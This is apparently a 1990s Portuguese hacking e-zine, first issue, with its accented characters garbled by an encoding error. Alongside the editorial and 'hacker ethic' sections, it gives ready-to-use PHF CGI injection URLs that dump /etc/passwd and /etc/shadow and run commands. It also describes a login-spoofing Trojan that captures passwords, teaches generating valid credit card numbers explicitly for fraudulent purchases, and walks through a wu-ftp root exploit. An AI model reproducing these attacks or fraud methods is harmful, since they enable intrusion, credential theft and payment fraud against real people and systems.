...
Indice:
 ...
 - Disclamer 
 - Introduτπo 
 - Qual Θ o objectivo desta zine? 
 - Secτ⌡es da .pt zine 
 - Hacking... O que Θ?? 
 - PHF Web Hacking 
 - Cavalos de Tr≤ia 
 - Criar a funτπo getpwent(char *nome_fich) 
 - Algoritmo para gerar n·meros de cart⌡es de crΘdito vßlidos 
 - Gzip pseudo-bug
 - Exploits:
         - wu-ftp.c
         - zgv.c
...
╔ bom um gajo dizer sempre estas cenas:
A informaτπo contida nesta zine pode ser considerada de ilegal, por isso, nπo 
nos responsabilizamos com o que faτas com ela! A responsabilidade Θ toda tua.
Todo o material contido aqui deve ser exclusivamente usada para fins 
educacionais...

Se utilizares a informaτπo contida nesta zine para actividades ilegais ficas 
desde jß avisado que n≤s nπo nos responsabilizamos pelo o que te possa 
acontecer.

Pronto, resumindo o que a gente estß a tentar-te explicar Θ que se fizeres 
asneiras nπo ponhas as culpas em n≤s... se a bofia te aparecer em casa, nπo 
digas que a culpa Θ nossa. 
...
Pois Θ,... ao fim de bastante tempo, um sonho nasceu! Criar a primeira
zine portuguesa. Uma zine feita por portugueses para portugueses...
Primeiro de tudo temos de dizer, que se vocΩ Θ daqueles leitores que
estß a ler esta zine para ver se tem algum artigo, que explique detalhadamente 
e com uma linguagem simpl≤ria, como hackar um server..., mais vale desligar
o computador, pois irß apanhar uma desilusπo!! Podφamos fazer isso, mas a 
intenτπo nπo serß essa. Pretendemos que esta zine seja um impulso, para o gosto 
pela auto-aprendizagem.
Os objectivos desta zine, sπo basicamente os de:
       -Introduzir o portuguΩs no hacking.
       -Divulgar noticias, na ßrea do hacking, e na generalidade 
        informßtica.
       -Tentar resolver quest⌡es, a pedido, ou sugestπo dos leitores.
       -Abordar assuntos, como programaτπo, e diferentes linguagens.
       -Abordar directamente assuntos relacionados com o hacking.
       -etc...
Querφamos tambΘm aproveitar para dizer, que estamos muito desiludidos,
com a fraca participaτπo, em termos de colaboradores... a principio, muita
gente parecia interessada, e bastante atΘ..., mas a passagem α pratica, foi
muito diferente do que estßvamos a espera!!
Portanto se vocΩ ao ler estes artigos, os achar "foleiros", ou pensar
que fazia melhor... pense antes, que isto foi o trabalho de trΩs ou quatro
pessoas, que resolveram embarcar neste projecto, apenas pelo amor a "arte",
sem segundas intenτ⌡es, e sem praticamente nenhuma ajuda.
Fica entπo aqui mais um apelo,... agradecφamos toda e qualquer tipo de
colaboraτπo,...escrevam artigos (nπo se preocupem que o pessoal os achem uns
lamers, pois o que para uns e bßsico, para outros pode ser um quebra-cabecas,
e vice-versa,... pois cada um aprende a seu ritmo e a sua maneira!!), dΩem
dicas, ponham d·vidas, respondam ßs quest⌡es,...pois n≤s teremos o maior
prazer de as divulgar... e assim nascer uma grande zine! (Fica entπo aqui o
agradecimento as pessoas, poucas, que responderam ao nosso desafio).

Em relaτπo a periocidade, iremos tentar ser o mais pontußveis possφvel,... 
e apenas o sucesso das primeiras ediτ⌡es, ira ditar a periocidade...
       Se por vezes ao lerem os artigos, tiverem uma sensaτπo de deja-vu, nπo
se admirem, pois todos acordamos que artigos, que considerßssemos de grande
qualidade em zines estrangeiras, seriam "tratados", (e nπo copiados),para
aqui.
A estrutura da .pt zine, assentarß na divisπo em secτ⌡es:
Cada secτπo terß um tema, tais como, programaτπo, redes, novidades,
curiosidades, correio dos leitores, etc.
Iremos tambΘm fornecer software, exploits etc...
Espero que achem esta iniciativa ·til ,e mais uma vez apelo a colaboraτπo.
...
O objectivo desta zine Θ mostrar que em Portugal tambΘm existem bons hackers.
Tentaremos que esta zine sirva para ensinar os mais novos e que seja um ponto 
de discussπo activo para os hackers mais velhos Portugueses.

Pretendemos que esta zine seja para o "newbie" e para o "oldie", e por isso 
iremos ter artigos sobre assuntos muito bßsicos e outros artigos mais "hard".

Esta Θ a primeira zine em portuguΩs (feita em Portugal) dedicada a hacking e 
por isso pretendemos que esta zine seja um sφmbolo dos hackers lusos.

Com esta zine pretendemos introduzir o portuguΩs no hacking; divulgar noticias 
na ßrea do hacking e na generalidade informßtica; tentar resolver quest⌡es, 
a pedido, ou sugest⌡es dos leitores; abordar assuntos como programaτπo e 
diferentes linguagens; abordar  directamente assuntos relacionados com o 
hacking.

Tentaremos ser o mais interactivos possφveis e prometemos que todos v≤s serπo 
ouvidos e respondidos com a maior prontidπo possφvel.
...
Ao longo da duraτπo da .pt zine vamos tentar manter estas secτ⌡es e 
esta estrutura:
        - Disclamer ( o texto do costume...)
        - Introduτπo (aonde escreveremos o que nos vier α cabeτa!);
        - Stuff (iremos ter vßrios artigos sobre hacking, programaτπo e 
        informßtica em geral);
        ...
        tentaremos dar respostas αs perguntas ou entπo pediremos que nos 
        enviam as respostas);
        - Conclusπo (o que poderπo esperar no pr≤ximo n·mero, e outras cenas 
        quaisquer);
        - Agradecimentos (o nome e contacto de todas as pessoas 
        que estiveram envolvidos corrente n·mero na zine).
...
(warez traders) Θ tudo a mesma coisa! Mas na verdade existe uma grande 
diferenτa entre eles.

Um hacker Θ uma pessoa que adora informßtica e que gosta de explorar/conhecer 
tudo sobre computadores, redes, etc...

        Um hacker nπo anda a trocar ou vender software ilegal, a isso se chama 
piratas ou warez traders.
        Um hacker nπo destr≤i o sistema que hackou, a isso se chama cracker.

        Um hacker explorar, tenta descobrir tudo sobre um dado sistema. 
O objectivo do hacker Θ o conhecimento.

A alegria do hacker Θ entrar num server sem a ajuda de ninguΘm, sabendo que foi 
mais inteligente que o admin do sistema... 

Andam por ai algumas pessoas que auto se proclamam hackers, mas na verdade 
nπo o sπo! Nπo basta ler a Phrack para se ser hacker; nπo basta estar montes de 
tempo no #hackers; nπo basta escrever assim: !o k E' K tU Kerez???"; nπo basta 
ouvir Prodigy. Para seres um hacker tens que hackar!!!
Tens que meter a mπos α obra e andar de server em server, investigar, explorar, 
aprender.

Os hackers acham que toda a informaτπo devia ser livre. Existem duas maneiras 
de acabar com os hackers:
        - destruir todos os computadores e instalaτ⌡es telef≤nicas (eheehhe... 
        esta nπo me parece muito vißvel);
        - disponibilizar toda a informaτπo de graτa e sem censura.


Um verdadeiro hacker Θ um hacker com Θtica, com um c≤digo de honra, estes sπo 
para mim algumas das regras que eu me sigo:
        - Nπo destruo sistemas/servers. Burrices como esta podem-me levar α 
        prisπo;
        - Nπo altero os ficheiros do sistema a nπo ser aqueles que servem para 
        encobrir os meus rastos e que me dΩm a oportunidade de voltar novamente 
        ao sistema;
        - Se alterar alguma pßgina Web de algum server deixo sempre os ficheiros 
        que lß estavam, posso Θ mudar os nomes deles. Nunca apago nada;
        - Nπo partilho os meus projectos a quase ninguΘm. S≤ mesmo quem for 
        muito, mas muito de confianτa;
        - Uso sempre o meu nickname, nunca uso o meu nome verdadeiro;
        - Nunca falo sobre os meus projectos no telefone de casa;
        - Nπo ando por ai a nukar ou a hackar servers s≤ porque eu acho que a 
        pessoa responsßvel Θ um lamer de merda;
        - Nπo me gabo dos meus feitos a qualquer um;
        - Nπo me considero um hacker de elite, nem julgo q sou mais que os 
        outros, sei que existirß sempre alguΘm q saberß mais do que eu;
        - Tenho paciΩncia. Acho que paciΩncia Θ uma grande virtude num hacker.
...
Ok, podem comeτar a dizer "Que lame zine!! Esta merda jß o meu primo de 4 anos 
sabe fazer!!". 
Mas eu jß estou farto de o pessoal novato me dizerem: "Ensina-me a hackar...", 
"Como saco o ficheiro das passwords", etc...
Apesar do bug do phf ser antigo (salvo erro foi descoberto em Novembro de 1996), 
em algumas empresas e universidades, aonde nπo hß dinheiro para investir na 
seguranτa ou simplesmente porque o admin acha que ninguΘm se lembraria de hackar 
o server deles, ainda se consegue sacar o ficheiro password ou o shadow atravΘs 
de um simples 
.../cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd .

Aquilo que precisas para sacar o ficheiro passwd ou o shadow Θ simplesmente o 
...
isto significa que o ficheiro estß shadowed, entπo escreve
http://"nome do server"/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/shadow


AtravΘs do phf tambΘm podes executar comandos tais como:
        http://"nome do server"/cgi-bin/phf?Qalias=x%0a/bin/ls%20/bin
        http://"server name"/cgi-bin/phf?Qalias=x%0a/bin/ls%20-la%20/bin


Volto a dizer que este bug jß Θ antigo e sπo muitos os servers que ainda 
tem o PHF script a correr .


Ok, espero que tenham compreendido isto tudo, mas se nπo perceberam nΘpias 
daquilo que eu estive a falar o melhor Θ dedicarem-se ao crochet!! 
...
by Elektro
      ...
      Aqui hß uns tempos recebemos um mail, que nos perguntava, o que Θ um 
cavalo de Tr≤ia, como funciona, se resulta...
      Aqui vai:
      Um cavalo de Tr≤ia, Θ um pequeno e simples programa, que funciona tem 
como principal objectivo, simular o ecrπ de login de um sistema. Ou seja, Θ um
programa, que esta a correr numa conta normal, mas que possui o interface da 
sessπo de login, que vemos, quando nos ligamos ao sistema...o objectivo Θ 
enganar o utilizador que vai utilizar a maquina a seguir a n≤s,(n≤s pomos o 
cavalo de Tr≤ia a correr e o desgraτado, que vira a seguir, muito inocentemente,
tentara entrar para a sua ßrea, escrevendo o seu login e a sua password,nos
campos do nosso cavalo de Tr≤ia,...que registarß tudo num ficheiro, na ßrea 
onde corre o programa!!:)))
      Sπo geralmente, programas simples, pequenos, que nπo requerem muitos 
conhecimentos de programaτπo, e os erros sπo faceis de detectar!!
      No mφnimo pode-se dizer que sπo programas "divertidos", pois estar a 
observar a nossa obra a actuar, Θ demais!:)) 

      Existem porem, alguns pontos a ter em consideraτπo, ao fazer um cavalo de
Tr≤ia: proteger o programa dos sinais, tais como o Ctrl-c, ou Ctrl-z, que sπo
os mais conhecidos,...e arranjar maneira de no final, o programa feche a ßrea
onde esta a correr (obvio, para quem nπo quer ser apanhado), e aqui Θ que 
complica mais um bocado, mas existe uma maneira, que na minha opiniπo e a mais
segura: serß a de fazer um kill ao processo pai, do nosso programa!!!Na practica
isto e, fazer um kill a shell, logo uma VERDADEIRA sessπo de login iniciara!
No entanto, no meio de isto tudo, o cavalo de Tr≤ia, "apanhou" o login e a 
password a um pobre infeliz (teoricamente)!

      Para exemplificar, fiz um "esboτo" de um cavala de Tr≤ia, com os pontos
mais bßsicos, e mais essenciais: (continua..)
...
(continuaτπo...)
como Θ obvio este cavalo de Tr≤ia e para sistemas linux!
   ╔ obvio tambΘm que isto Θ um cavalo de troia "pobrezinho", serß sempre bom
melhorar o aspecto grßfico do output do programa (que e fßcil, e os pr≤prios
iniciantes em programacao conseguem faze-lo!).

   Outra coisa importante, Θ reparar como protegi o programa dos sinais Ctrl-c,
e Ctrl-z...porque senπo corrφamos o risco de vermos a nossa ßrea exposta, se a
vitima e mais esperta que n≤s!! Uma ideia sera tentar proteger o programa para
o maior numero possφvel de sinais!!
   Para no final encerrar a nossa ßrea, para fazer um kill a shell, ou ao 
processo pai, usei a funτπo getppid, para obter o Parent Process Id, e no final
enviei o sinal 9, que e o kill,... e quando o programa termina, em vez de 
retornar a shell, como esta "morreu", corre uma verdadeira sessπo de login.
   Para aumentar a seguranτa, o ficheiro para onde sπo registados os resultados
do cavalo de Tr≤ia e um ficheiro oculto (.pw_log)...outras precauτ⌡es, poderπo
ser tomadas, se por exemplo ao compilar o programa lhe der o atributo de ocul-
to...(para quem nπo sabe, isto consegue-se se o primeiro caracter do nome do
ficheiro for '.'!
   O ciclo criado enquanto o login for nulo, prevΩ que a vitima faτa qualquer 
coisa como fazer return em "branco"...
   Para acabar,...resta dizer que para "receber" a password, usei a funτπo
getpass, declarada no header pwd.h,...esta funτπo redirecciona o output.
Podia-se ter usado a funcao stty do sistema...faτam, quem estiver em Linux,
man stty.
   Mais uma vez friso, que estes programas devem-se aproximar o mßximo da 
...
by Elektro
      ...
      Os conhecidos crackers, sπo programas complicados de criar!!Requerem o
uso de algoritmos muito complexos, e os erros por vezes sπo impossφveis de
detectar!!
      Ao contrario do que muita gente pensa, um cracker por exemplo quando
esta a "tratar" de uma password, nπo inverte o algoritmo de encriptaτπo, pois
isso levaria na pratica, com o maior poder de computaτπo existente 
...
inverte o algoritmo de encriptaτπo!
      O que um cracker realmente faz e, dada uma string (possφvel password),
o programa usa o algoritmo de encriptaτπo, sobre essa string, e compara o 
resultado final...dai o facto de a parte mais importante de um cracker seja a
wordlist!
      Mas nao Θ isso que este artigo pretende...este artigo pretende abordar
um assunto diferente: como carregar as entradas de um ficheiro passwd, usando
uma funτπo que aceite como argumento qualquer ficheiro, que nπo o /etc/passwd
em linux, ou em dos, para memoria?
      Quem ja fez um cracker, sabe do que estou a falar!!!!!
      Para os utilizadores do Linux, que conheτam a funτπo getpwent, sabem 
...
entradas para memoria! Como o faz:
     ...
     Serß necessßrio primeiro dizer que as entradas ficam dispostas em 
memoria, na seguinte struct:
     ...
     E entπo, a funτπo getpwent(), que poe as entradas das linhas do ficheiro
nesta estrutura! Porem a funτπo getpwent(), declarada em pwd.h, nao aceita
argumentos, limitando o uso desta funτπo ao computador host,e em DOS esta
funτπo nπo existe. Logo foi necessßrio criar uma funτπo getpwent, que 
aceita-se como argumento, uma string com o nome do ficheiro "alvo".
     A funτπo continuarß a retornar um apontador para a struct.
     Ora isto pode nπo ser fßcil, mas nπo e nada de outro mundo, basta 
reconstruir a funτπo:
(para usufruir da porτπo de c≤digo que se segue faτa um 'cut and paste', para
...
-------------------------------CORTE AQUI------------------------------------
  ...
  Entπo como pudemos ver a funτπo getpwent2, aceita como argumento, o vector
onde se encontra o nome do ficheiro a abrir, e continua a retornar um 
apontador para a estrutura... estß entπo ultrapassado o problema do carregamento 
das entradas do ficheiro passwd para a memoria.
  Poder-se-ia tambΘm criar uma funτπo que copiasse as entradas directamente,
para memoria pre-reservada, mas nπo seria tπo eficiente.
  Para ficar a saber mais sobre esta funτπo, e sobre a struct passwd: faτa
...
Com certeza, toda a gente jß ouviu falar nos geradores de n·meros de cart⌡es de 
crΘdito!!!Porem muita asneira Θ dita, acerca deste assunto. 

     1) Quando se efectua uma transacτπo na web, o site "vitima", nπo verifica, 
imediatamente, se o cartπo tem crΘdito associado.(alem de que este tipo de 
informaτπo e confidencial e apenas, instituiτ⌡es bancßrias, teem acesso a este 
tipo de informaτπo).
     2)Um cartπo pode ser vßlido, ou seja, o n·mero ter sido gerado pelo 
algoritmo correcto, e num entanto, nπo estar atribuφdo, ou seja nenhuma entidade 
bancßria, ou financeira o tenha atribuφdo a um utilizador.
     3)O facto de um cartπo nπo estar atribuφdo, ao contrßrio do que se diz, 
nπo inviabiliza uma compra...devido ao ponto 1).
     4)Se um gerador, por ventura, gerar um numero atribuφdo...
╔ PURA COINCID╩NCIA!!! 

O sucesso, deste tipo, de falcatrua, Θ relativo...eu, pessoalmente, nunca 
tentaria comprar um Rolex, deste modo...porem,...quem resiste a dar uma 
espreitadela, no bem guardado e bem pago site da Playboy! 
Claro, que recomendo, ao que pensam em se aventurarem nestes domφnios, a 
darem uma saltada em www.anonymizer.com . 

Ao que interessa: 

Um n·mero vßlido de um Cartπo de CrΘdito (CC), tem 16 algarismos, dos quais 
os quatro primeiros (chamado prefixo), indicam o c≤digo do banco emissor, e 
...
Θ um serviτo especial do
Banco Totta e Aτores, tem um prefixo (4775), diferente dos cart⌡es usuais!).

     3 -> American Express
     4 -> Visa (a mais usada em Portugal)
     5 -> MasterCard
     6 -> Discover (esta rede nπo e usada em Portugal)


Como se verifica entπo que um n·mero Θ vßlido?: 

Por exemplo o cartπo... 4938 0723 5791 0411 (rede: Visa ,Banco Pinto & Sotto 
Mayor). 

Se pegarmos nos algarismos que ocupam as posiτ⌡es impares no n·mero do CC: 
4 3 0 2 5 9 0 1 e apenas nestes, que ocupam posiτ⌡es impares. 

Agora a esses algarismos multiplica-se 2, se o resultado for maior que 9, 
dever-se-a subtrair nove a multiplicaτπo...ficara entπo algo como: 

8 6 0 4 1 9 0 2 ..isto entπo passarß, juntando outra vez os algarismos que 
ocupam as posiτ⌡es pares, para: 

     8968 0743 1791 0421 

agora se a soma de todos os algarismos deste novo n·mero for um m·ltiplo de 10 
e menor do que 150, o n·mero inicial Θ vßlido... 

ex: 8+9+6+8+0+7+4+3+1+7+9+1+0+4+2+1=70, que por sua vez e um m·ltiplo de 10 e 
Θ menor do que 150!! 

Junto incluo o c≤digo de um pequeno programa, que testa a validade de um dado 
n·mero de um CC (para melhor compreenderam o algoritmo): 
...
Mas, o que nos interessa, e saber como gerar n·meros validos de CC's...para 
isso e preciso saber muitos bem o algoritmo que testa a sua validade. 

Para gerar um n·mero, basta apenas escolher o prefixo do banco
(independentemente, se e Visa, ou qualquer outra rede): 

4938 .... .... .... 

Sabemos entπo o prefixo, e queremos criar o resto...pois bem, Θ fßcil: 

Geram-se aleatoriamente, mais 11 algarismos (E N├O 12!!), e ficamos, por 
exemplo com o seguinte: 

4938 1432 6745 362. 

Ou seja, o ·ltimo algarismo permanece, por agora desconhecido... 

Tal como na funτπo para testar, o processo e semelhante: nos algarismos que 
ocupam posiτ⌡es impares, multiplicam-se por 2, e os que com esta multiplicaτπo 
...
A soma total dos algarismos Θ: 

8+9+6+8+2+4+6+2+3+7+8+5+6+6+4=84 

Ora, para este numero ser valido, basta que o ultimo algarismo, que ainda nπo 
estß atribuφdo seja 6, pois: 

8+9+6+8+2+4+6+2+3+7+8+5+6+6+4=84+6=90 !!!! 

90 e menor do que 150 e Θ m·ltiplo de 10. Ora cß temos um n·mero gerado, 
vßlido!!!!!!!!!!!!!!!!! 

Para extrapolar n·meros, a partir de porτ⌡es de outros n·meros, o processo e 
exactamente o mesmo. 
Por exemplo, queremos extrapolar n·meros a partir da seguinte porτπo de 
um outro n·mero: 

4938 452. .... .... 

Geram-se aleatoriamente os restantes n·meros, excepto o ultimo, e pratica-se a 
jß conhecida regra!!!!!!!! 

Como podem ver, fazer um gerador de n·meros de CC's e simples, apenas requer 
prßtica de algoritmia. 

Jß agora ficam aqui tambΘm alguns prefixos de bancos portugueses, nπo inclui 
...
----------------
  ...
  Aqui hß uns tempos, jß nem me lembro onde, desencantei um texto, que a
principio nem dei muita importΓncia, mas que afinal revelou-se ser muito 
interessante!! Decidimos nπo o traduzir, para que nada se perdesse com uma 
fraca traduτπo! Ei-lo:
...
non-suid utilities must be written with security in mind."
  ...
  Esperamos que este texto tenha sido ·til, para vocΩs, ou no mφnimo, o 
...
/****************************************************************************
 *                                                                          *
 *   Com certeza jß conhecem o velhinho wu-ftp, mas continuo a achar que Θ  *
 * eficaz, e que se bem "tratado" pode substituir os RootKits:              *
 *                                                                          *
 *  1║ COMPILA-SE, NUMA SESS├O DE TELNET O SEGUINTE C╙DIGO:                 *
 *  (obviamente que Θ necessßrio possuir uma conta vßlida no sistema)       *
 *                                                                          *
 ***************************************************************************/
 main(){
 ...
 /***************************************************************************
 *                                                                          *
 *  Para quem nπo imagina como fazer isto, :-|, MANDA POR FTP este ficheiro *
 *                                                                          *
 *  Agora cria-se um shell script, chamado root.sh, com o seguinte:         *
 *                                                                          *
 *  exec a.out                                                              *
 * (em que a.out e o c≤digo do wu-ftp compilado)                            *
 *                                                                          *
 *  Agora ligado remotamente por ftp, na conta que estamos a utilizar:      *
 *  ftp> quote site exec sh root.sh                                         *
 *                                                                          *
 *  De seguida saimos do ftp, e corremos na sessπo de telnet /tmp/.suidroot *
 *                                                                          *
 *  Veremos na prompt o sφmbolo '$', passar a '#'. :)))))))))))))           *
 *                                                                          *
...
HACKER OU FALHA DE HARDWARE MANDA A TELEPAC ABAIXO DURANTE 3 DIAS? 
        Durante quase 3 dias, o serviτo de email do maior ISP PortuguΩs esteve
inoperacional devido a um "presumφvel ataque de spamming" - tal como
aparece no site do operador. Assumi-nos que a Telepac se estarß a referir
a mail-bombing, ou seja, envio continuado de largos volumes de email atΘ
conseguir "entupir" o server de mail. Mas s≤ isso nπo explica que o
sistema estivesse em baixo o tempo todo para reposiτπo de mais 20GB de
informaτπo, mesmo tendo em conta que o equipamento Θ "considerado
completamente redundante [...] a nφvel de discos, fonte de alimentaτπo e
controladores". Daφ que a afirmaτπo oficial da firma nos levante algumas
suspeitas: ou algo de muito grave aconteceu no hardware e os backups nπo
...
despercebido o facto da Telepac ter instituφdo o n·mero nacional ·nico
para acesso α Internet permitindo sempre pagar chamada local em qualquer
ponto do Paφs.
...
Mais informaτ⌡es em : http://kaotik.home.ml.org/timor/bppt1.html
...
A maioria do mail que recebemos atΘ agora foi algo parecido com:

"Eu gostava de colaborar na zine, mas nπo sei o que poderei fazer" 

RESPOSTA:
by secretos

Podem fazer imensas coisas!! Vou s≤ deixar algumas ideias:

     - escrever um texto sobre um determinado assunto relacionado com hacking, 
        redes ou computadores em geral; 

     - traduzir um texto que acham que estß bem elaborado e que podia servir 
     ...
     - responder αs perguntas levantadas nesta secτπo pelos leitores; 

     - enviar crφticas e opini⌡es; 

     - etc... 

Nπo tenham medo de escreverem algo que pensam que jß toda a gente sabe. 
Nπo tenham medo de ser chamados lamers... mais lamers sπo aqueles que s≤ sabem 
criticar!! 
...
Ok, este foi o n·mero 0 da .pt zine. Espero que gostem. Mas se nπo gostaram 
faτam melhor, nπo se limitem a criticar... Dizer mal dos outros Θ fßcil! 

Este n·mero foi s≤ um teste, queremos ver a reacτπo das pessoas. 

Esperemos que esta zine dure longos anos... 

Nπo fazemos a mφnima ideia de como serß o n·mero 1 da .pt zine... Agora vamos 
de fΘrias e depois a gente pensa nisso... 
TambΘm nπo fazemos a mφnima ideia de quando sairß o n·mero 1 da .pt zine... 
Estejam atentos. 

Para pr≤ximo n·mero da zine esperamos que vocΩs participem mais. 
...
Neste n·mero 0 da .pt zine queremos agradecer a todos aqueles que nos apoiaram: 

        - A todos os membros da KaotiK Team (http://kaotik.home.ml.org), sem eles 
        esta zine nπo teria nascido 

        - Ao Elektro (elektro@null.net), pelos textos e pela forτa de vontade. 

        - Ao secretos (secretos@hotmail.com), pelos textos e pelo design e HTML 
        da zine. 

     - A mais ninguΘm!! Mais ninguΘm ajudou!!!!! :-(( 
